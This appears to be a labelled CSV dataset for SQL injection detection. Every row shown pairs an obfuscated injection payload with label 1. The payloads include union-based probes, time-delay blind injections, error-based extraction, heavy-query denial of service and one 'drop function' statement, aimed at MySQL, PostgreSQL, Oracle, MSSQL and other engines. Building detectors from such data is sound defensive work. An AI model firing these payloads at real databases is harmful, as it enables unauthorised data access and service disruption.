Query,Label
"1"" %%a%%nd   (  %s%%e%%l%%e%c%t 2*  (  if   (    (   %s%%e%%l%%e%c%t * fr%%om   (  %s%%e%%l%%e%c%t concat  (  0x7171706a71,  (  %s%%e%%l%%e%c%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %%a%%nd ""svse""  =  ""svse",1
"1'  )   %w%h%e%r%%e 5276  =  5276 union all %s%%e%%l%e%ct %%n%%ull,%%n%%ull--",1
1   )    )     )   %o%r sleep  (  5  )   a%%n%d    (    (     (  2209  =  2209,1
"1'  )   as zxho wh%%e%r%%e 5907  =  5907 or 6979  =  l%i%ke  (  'abcdefg',upper  (  hex  (  r%a%%ndomblob  (  500000000/2   )    )      )    )   --",1
"1%""  )   %o%%r sleep  (  5  )  #",1
"1'  )   w%h%%e%r%e 8348  =  8348 %and elt  (  4249  =  4249,7259  )  --",1
1 waitf%o%%r delay '0:0:5'--,1
"1'||  (  sele%%c%%t 'aair' %%wh%e%re 9234  =  9234 union all sele%%c%%t n%u%l%l,n%u%l%l,n%u%l%l,n%u%l%l#",1
"-4165"" %%w%%he%%r%%e 1772  =  1772 union all %s%e%le%ct 1772,1772,1772,1772,1772,1772,1772,1772--",1
"1%""  )   %%or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%u%l%%l  )  ,0  )  ,500000000  )  ,n%%u%l%%l  )   %an%d   (  ""%""  =  """,1
"-8521'  )   union all s%e%%l%%ec%%t 2446,2446,2446,2446,2446,2446,2446#",1
"1%' a%%nd u%p%da%t%%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  %%se%%le%c%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   a%%nd '%'  =  '",1
"1%"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %s%e%%le%%c%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   %%a%n%d ""%""  =  """,1
"-8109%""   )    )    union all %%s%el%%e%c%t 9089,9089--",1
1  )   %%an%%d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%l%e%%ct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   f%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"1'+  (  %%sel%%e%%c%%t pxrg %w%%h%er%%e 5589  =  5589 %%or 5356  =    (  %%sel%%e%%c%%t count  (  *  )   %%f%%r%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'||  (  %s%%el%ec%%t 'uebk' %fr%o%%m dual %%w%h%%ere 6990  =  6990,1
"1"" rl%i%%ke   (  %sel%%e%%c%%t   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    %%a%nd ""iqlh"" l%i%%ke ""iqlh",1
"-9007  )   as gill %%w%h%er%%e 6462  =  6462 union all %%sel%ect 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1
"1""   )    )     )   %%an%%d make_se%t  (  6751  =  8128,8128  )   %%an%%d    (    (     (  ""uhiy""  =  ""uhiy",1
1%' %and 7366  =  9197#,1
"-6731"" w%%her%e 6166  =  6166 union all %sele%ct 6166,6166,6166,6166,6166,6166--",1
"1   )    )     )   %a%%n%%d make_%%s%et  (  8882  =  1593,1593  )   %a%%n%%d    (    (     (  7989  =  7989",1
1'  )   a%%n%%d   (  3020  =  3020  )  *6703,1
else dbms_lock.sleep  (  0  ) ,1
"1""   )    )    as qrok %w%%h%e%%r%e 8257  =  8257 %o%%r 8421  =    (  s%e%%l%%e%c%t count  (  *  )   %%f%r%om generate_series  (  1,5000000   )    )   --",1
"1""   )    )    as yuqr %%whe%re 7226  =  7226 %a%n%%d   (  %%sele%%c%%t * f%r%%o%m   (  %%sele%%c%%t  (  sleep  (  5   )    )     )  gcrr  )  #",1
"%s%%e%%l%%ec%t count  (  *  )   %f%rom generate_series  (  1,5000000  )   %a%%nd    (    (     (  ""wdbg"" %%l%i%%k%%e ""wdbg",1
-2658  )   as casi wh%e%r%%e 7364  =  7364 or 8245  =  9651--,1
"1""   )    )     )   or %u%%pda%%t%%exml  (  1808,concat  (  0x2e,0x7171706a71,  (  %%s%%e%l%%e%%ct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   %%and    (    (     (  ""tzqk"" l%i%%ke ""tzqk",1
-7984' %%o%r%de%%r %by 1--,1
"1"" %wh%%e%%r%e 6352  =  6352",1
"1%'   )    )     )   %%and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,nul%l  )  --",1
"-4695'   )    )     )   union all %se%%l%%ect 5844,5844,5844,5844,5844,5844#",1
-8028%'   )    )     )   %or 5042  =  5214,1
"-2382%'  )   union all %s%el%%e%c%t 8885,8885,8885,8885,8885,8885,8885#",1
"1"" union all %%se%%l%e%%c%t %%n%%u%%l%l#",1
1'||  (  %s%%e%l%%ect 'bifa' w%%her%e 6077  =  6077 %an%%d 4547  =  9301,1
"1'  )   %o%%r row  (  1045,7562  )  >  (  %se%%l%%e%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %se%%l%%e%%ct   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%o%%r  (  r%%a%nd  (  0  )  *2   )    )   x f%%r%o%%m   (  %se%%l%%e%%ct 8488 union %se%%l%%e%%ct 5584 union %se%%l%%e%%ct 3051 union %se%%l%%e%%ct 1210  )  a group %b%y x  )   %%a%nd   (  'xzlx' %%l%%i%%k%%e 'xzlx",1
1   )    )    as ojjk %%whe%%r%e 3687  =  3687 and   (  4833  =  9218  )  *9218--,1
"-7236 %o%%r make_%s%e%%t  (  9618  =  6919,6919  )  ",1
"1""  )   as htyo %w%h%e%%r%%e 8322  =  8322 a%n%d 4595  =  4595#",1
1  )   %whe%%re 9552  =  9552 a%n%%d 1961  =  6333--,1
"%s%e%%le%c%%t pg_sleep  (  5  )   %and    (    (   ""%b%yhx"" l%%i%k%e ""%b%yhx",1
"1""  )   as nqtn %w%%he%r%e 5606  =  5606 a%n%d 9660  =    (  %%se%%le%c%%t count  (  *  )   %f%%r%%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%'   )    )    union all se%%l%e%%c%%t %n%u%%l%%l,%n%u%%l%%l,%n%u%%l%%l,%n%u%%l%%l,%n%u%%l%%l,%n%u%%l%%l,%n%u%%l%%l--",1
"1%""   )    )     )   rli%k%%e   (  %s%%e%%lect * %f%%ro%%m   (  %s%%e%%lect  (  sleep  (  5   )    )     )  vwyq  )  #",1
"-7940%""  )   union all %%s%%el%%ect 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1
"1""  )   as axua %w%%her%%e 6718  =  6718",1
"1'   )    )    as efmy %%w%h%er%%e 7299  =  7299 %%an%d 8635  =    (  %%s%%e%%le%%c%t count  (  *  )   %f%%r%%o%%m generate_series  (  1,5000000   )    )   --",1
1'+  (  %%s%%el%%ect 'ueak' %w%h%%e%%r%e 7329  =  7329 %and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%s%%el%%ect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1
"1  )   %%w%her%e 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"1""   )    )    %a%n%d char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,n%u%l%l  )   %a%n%d    (    (   ""oxvs"" %%l%%i%k%e ""oxvs",1
"1'  )   as ohnu %w%he%%re 4097  =  4097 union all s%e%l%ect nu%ll,nu%ll,nu%ll,nu%ll,nu%ll,nu%ll,nu%ll,nu%ll,nu%ll--",1
"%%s%el%e%%c%%t count  (  *  )   %f%%r%%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %a%n%%d ""jkfk""  =  ""jkfk",1
"1%'   )    )    %a%%n%d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %a%%n%d    (    (   '%'  =  '",1
-6036   )    )     )   o%r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%s%el%%ec%%t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   an%d    (    (     (  6723  =  6723,1
"1'||  (  s%%e%le%%c%%t 'gikt' w%%h%e%re 8447  =  8447 %%o%r 1022  =    (  s%%e%le%%c%%t count  (  *  )   f%rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1  )   union all %%se%%lec%%t nu%%ll,nu%%ll,nu%%ll,nu%%ll,nu%%ll,nu%%ll#",1
"1""  )   %%and 9198  =  9198--",1
"1'   )    )    %o%%r row  (  1045,7562  )  >  (  s%%e%%l%e%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%%e%%l%e%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%o%%r  (  r%a%%nd  (  0  )  *2   )    )   x %f%r%%o%m   (  s%%e%%l%e%c%%t 8488 union s%%e%%l%e%c%%t 5584 union s%%e%%l%e%c%%t 3051 union s%%e%%l%e%c%%t 1210  )  a group %%b%%y x  )   %a%%nd    (    (   'wbsz'  =  'wbsz",1
1'+  (  %%se%l%e%c%%t 'rqok' w%%h%e%%r%e 5074  =  5074 %%a%nd 4386  =  utl_%i%%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%l%e%c%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   fr%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',1
1'   )    )    a%nd   (  1427  =  5813  )  *5813 a%nd    (    (   'estb' %%li%ke 'estb,1
"1"" a%n%d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  s%e%%l%%e%ct   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
-3566%' %%o%r 2158  =  6289,1
"%s%%e%lect %l%%i%k%%e  (  'abcdefg',upper  (  hex  (  r%%andomblob  (  500000000/2   )    )      )    )     )  ||'",1
"-7041""   )    )     )   union all %%s%e%le%%ct 2159,2159,2159,2159,2159--",1
"1""   )    )    as qgwq %%wh%%er%%e 6122  =  6122",1
"1""   )    )    as uels %wh%%er%e 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1 a%n%d make_%set  (  9542  =  8888,8888  )  -- idkn",1
1%'   )    )    %%o%%rd%%e%%r %b%y 1--,1
"1"" or   (  %s%el%%e%c%%t 9173 %%fr%o%m  (  %s%el%%e%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %s%el%%e%c%%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  r%%an%%d  (  0  )  *2   )    )   x %%fr%o%m %%i%%nformation_schema.character_%%s%%ets group b%%y x  )  a  )  ",1
"1 %%an%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%e%%l%%e%%ct   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   f%r%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rhli",1
"1'  )   wh%%e%%r%%e 8948  =  8948 %a%n%d 8635  =    (  %%s%%e%l%%e%c%t count  (  *  )   fr%%o%%m generate_series  (  1,5000000   )    )   --",1
"-9096""  )   wh%%e%r%e 9452  =  9452 %o%%r 4144  =    (  %s%%e%%le%%ct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%e%%le%%ct   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fr%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fr%o%m dual  )  --",1
 (  %%sel%%e%c%t   (  case when   (  9066  =  5598  )   then 1 else 9066*  (  %%sel%%e%c%t 9066 %f%%r%%om inf%ormation_schema.character_%%se%%ts  )   end   )    ) ,1
1'   )    )    as jtmf %%w%%her%e 3937  =  3937,1
"call regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%u%l%%l  )  ,0  )  ,500000000  )  ,%%n%u%l%%l  )   an%%d ""rbqs""  =  ""rbqs",1
"1   )    )    union all s%e%le%c%%t n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l,n%%u%%l%l#",1
"1'   )    )    %an%d 5556  =    (  s%e%l%e%%c%%t count  (  *  )   %f%r%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %an%d    (    (   'hpbt'  =  'hpbt",1
-9975 w%%h%ere 9760  =  9760 %%o%rd%%e%%r %by 1--,1
"-5182""   )    )    or 1 group %%b%y concat  (  0x7171706a71,  (  %se%%l%e%%ct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  r%%a%%nd  (  0  )  *2   )    )    hav%i%%ng m%i%%n  (  0  )  #",1
"1'   )    )    a%n%d elt  (  1210  =  1210,sleep  (  5   )    )    a%n%d    (    (   'jnmf'  =  'jnmf",1
1'+  (  %%s%e%le%ct hrgu w%%h%er%e 9587  =  9587,1
s%e%%l%e%c%%t case when 8237  =  9948 then 1 else %%n%u%%l%l end--,1
"-3781%'  )   union all s%el%%e%%c%%t 7497,7497,7497,7497,7497--",1
waitfo%r delay '0:0:5' a%n%d '%'  =  ',1
1' %%w%her%e 9544  =  9544,1
"1%' %o%r char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%nu%%l%%l  )  ,0  )  ,500000000  )  ,%nu%%l%%l  )  --",1
"1'  )   a%%n%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%u%%l%l  )  ,0  )  ,500000000  )  ,%%n%u%%l%l  )   a%%n%d   (  'qdsr' %%l%ik%%e 'qdsr",1
"1%'   )    )    a%nd exp  (  ~  (  %%se%%l%%e%c%t * %f%%ro%%m   (  %%se%%l%%e%c%t concat  (  0x7171706a71,  (  %%se%%l%%e%c%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a%nd    (    (   '%'  =  '",1
if  (  5316  =  4416  )   %s%e%lect 5316 else d%%ro%p function vtve--,1
"-5169""   )    )    union all %%s%%el%%ec%%t 6198,6198,6198,6198--",1
"1"" %w%h%er%%e 8234  =  8234",1
"1""   )    )    as hiuf %w%%he%r%e 3277  =  3277 %a%n%d 3715 i%%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%%e%%l%%ect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-8200' %w%%he%r%e 3422  =  3422 o%r 1570  =  convert  (  %%i%%nt,  (  %s%elect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %s%elect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1   )    )    as qfnu w%her%%e 1609  =  1609 a%n%%d 8189  =    (  %%sele%c%t count  (  *  )   %%f%r%o%m sysibm.sys%ta%b%l%es as t1,sysibm.sys%ta%b%l%es as t2,sysibm.sys%ta%b%l%es as t3  )  --",1
"1'  )   %an%d 5556  =    (  s%e%le%ct count  (  *  )   f%%r%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %an%d   (  'xfmq'  =  'xfmq",1
1'  )   and 3754  =    (  %%s%%e%%l%%e%%ct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%e%%l%%e%%ct   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   %%f%ro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%f%ro%m dual  ) ,1
"-8358'   )    )     )   union all se%%l%e%%c%t 7282,7282--",1
-7726 %or 3038  =  3038,1
"1""   )    )    %%o%%r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""rurz""  =  ""rurz",1
"1' i%n boolean mode  )    (  s%%e%%l%%e%%ct   (  case when   (  4587  =  4587  )   then regexp_substri%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%u%ll  )  ,0  )  ,500000000  )  ,%%n%%u%ll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  val%u%es  (  0   )    )     )  #",1
"1'||  (  %sele%%ct 'fbtm' %w%%h%%er%e 1335  =  1335 %%a%%n%%d exp  (  ~  (  %sele%%ct * fr%%o%m   (  %sele%%ct concat  (  0x7171706a71,  (  %sele%%ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
"1   )    )     )   %%an%d row  (  6237,7469  )  >  (  %%s%%e%%l%%e%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%%e%%l%%e%ct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  r%%an%d  (  0  )  *2   )    )   x f%%ro%%m   (  %%s%%e%%l%%e%ct 5192 union %%s%%e%%l%%e%ct 3785 union %%s%%e%%l%%e%ct 3931 union %%s%%e%%l%%e%ct 7158  )  a group b%y x  )   %%an%d    (    (     (  4127  =  4127",1
1' w%h%er%%e 4403  =  4403 rlike sleep  (  5  )  #,1
"-6587'  )   union all %%s%e%l%%ec%%t 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1
"1%""   )    )     )   %%and 6510  =    (  %%s%e%%l%%e%%c%t count  (  *  )   f%r%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   %%and    (    (     (  ""%""  =  """,1
"1,  (  sele%%ct   (  case when   (  3743  =  9640  )   then 1 else 3743*  (  sele%%ct 3743 %f%%r%%o%m master..sys%%d%a%t%%ab%a%%s%%es  )   end   )    )   ",1
"s%el%e%%c%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    %%a%%n%d    (    (     (  ""eqmy""  =  ""eqmy",1
"1%'  )   %%o%r 4915  =    (  %s%%el%%e%c%%t count  (  *  )   fr%%o%m domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.%t%%abl%%es as t3  )  --",1
"-9886%'   )    )     )   union all %s%%e%%l%%e%c%%t 5191,5191,5191,5191,5191,5191,5191--",1
"1""  )   %or 5356  =    (  se%%l%%e%c%t count  (  *  )   %%fr%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-9111"" o%%r 3038  =  3038",1
"1""   )    )     )   union all %%s%e%l%%e%%c%t %%n%%u%l%%l--",1
"1"" %wh%e%%r%%e 9829  =  9829 %%o%rd%%e%r %by 1#",1
-2022   )    )     )   %%or 6812  =  3516 a%n%%d    (    (     (  3896  =  3896,1
-2505' %%o%%r 9323  =  9323#,1
"s%e%l%%e%c%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    %an%d '%'  =  '",1
1'  )   as pwqs w%%h%e%%r%e 2291  =  2291,1
-3978 o%r 4144  =    (  %%se%%le%c%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%%le%c%t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fro%m dual  )  -- mtun,1
"-7749"" o%%r   (  2689  =  7481  )  *7481",1
1   )    )    %%a%n%%d 2886  =  1133--,1
1  )   %w%h%e%%r%%e 9307  =  9307,1
"-4223'   )    )     )   union all %%se%%l%e%%c%%t 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",1
%%s%e%le%%ct   (  case when   (  1407  =  2741  )   then 1407 else 1407*  (  %%s%e%le%%ct 1407 %%fr%om mysql.db  )   end  )  #,1
"-9606 %%o%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%sel%%ec%%t   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   f%%ro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # iuij",1
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%u%l%l  )  ,0  )  ,500000000  )  ,n%u%l%l  )   a%n%%d    (    (     (  'akyc'  =  'akyc",1
-6823'   )    )     )   %%o%%r 4493  =  utl_%%inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%e%%le%%ct   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   f%ro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    an%%d    (    (     (  'lwlk' l%ik%e 'lwlk,1
"1' %w%%h%e%%r%%e 2160  =  2160 a%%n%%d exp  (  ~  (  %se%%l%e%ct * f%r%om   (  %se%%l%e%ct concat  (  0x7171706a71,  (  %se%%l%e%ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
-5820'   )    )    as lkik %%wh%%er%e 4044  =  4044 %o%r 7156  =  9197--,1
"1"" %%a%%nd   (  s%e%l%e%ct 9067 f%ro%%m  (  s%e%l%e%ct count  (  *  )  ,concat  (  0x7171706a71,  (  s%e%l%e%ct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo%r  (  r%%a%%nd  (  0  )  *2   )    )   x f%ro%%m %%info%rmation_schema.character_%s%%e%ts group %%by x  )  a  )   %%a%%nd ""jcgh""  =  ""jcgh",1
"1""   )    )    as yiaw %%w%h%%e%r%%e 2841  =  2841 or sleep  (  5  )  --",1
-5585' o%%r 4144  =    (  s%%el%%e%ct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%el%%e%ct   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   f%%r%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   f%%r%%o%m dual  ) ,1
1'   )    )     )   r%l%%i%ke sleep  (  5  )   %an%%d    (    (     (  'svuu'  =  'svuu,1
"1'+  (  %s%%e%l%%e%%c%t 'xqpe' %w%h%e%r%e 4020  =  4020 union all %s%%e%l%%e%%c%t %n%ull,%n%ull--",1
"-4849""   )    )    %%or   (  5005  =  9111  )  *9111 %and    (    (   ""catv"" %%l%%i%%k%e ""catv",1
"1'   )    )     )   %%a%%nd elt  (  1210  =  1210,sleep  (  5   )    )    %%a%%nd    (    (     (  'mbxh' l%i%%k%e 'mbxh",1
"1"" wh%%e%r%e 8732  =  8732",1
-2411%'   )    )     )   %%o%r 6872  =  6872 %a%%n%d    (    (     (  '%'  =  ',1
1'  )   %a%%nd 4822  =  6997 %a%%nd   (  'ojku'  =  'ojku,1
-7950'  )   o%r 9323  =  9323#,1
"1"" %a%nd exp  (  ~  (  %%s%%ele%ct * %%fro%%m   (  %%s%%ele%ct concat  (  0x7171706a71,  (  %%s%%ele%ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %a%nd ""oyuj""  =  ""oyuj",1
"call regexp_substri%%ng  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   a%%n%d    (    (     (  'opyt'  =  'opyt",1
%%s%e%l%%e%%ct pg_sleep  (  5  )   %an%%d    (    (   '%'  =  ',1
"1 %w%he%%re 2363  =  2363 union all %se%%l%%e%ct %%n%ull,%%n%ull,%%n%ull,%%n%ull,%%n%ull--",1
"1'   )    )    o%%r   (  se%l%ec%t 9173 %%f%r%o%m  (  se%l%ec%t count  (  *  )  ,concat  (  0x7171706a71,  (  se%l%ec%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo%%r  (  r%%an%%d  (  0  )  *2   )    )   x %%f%r%o%m %%i%%nfo%%rmation_schema.character_sets group b%%y x  )  a  )   %%an%%d    (    (   'rdpv'  =  'rdpv",1
"1' %or 8315  =    (  %s%ele%%c%t count  (  *  )   f%%r%o%m sysibm.sys%t%abl%es as t1,sysibm.sys%t%abl%es as t2,sysibm.sys%t%abl%es as t3  )   %%and 'eqyr' like 'eqyr",1
"1%""  )   union all %se%%l%%ec%%t n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l#",1
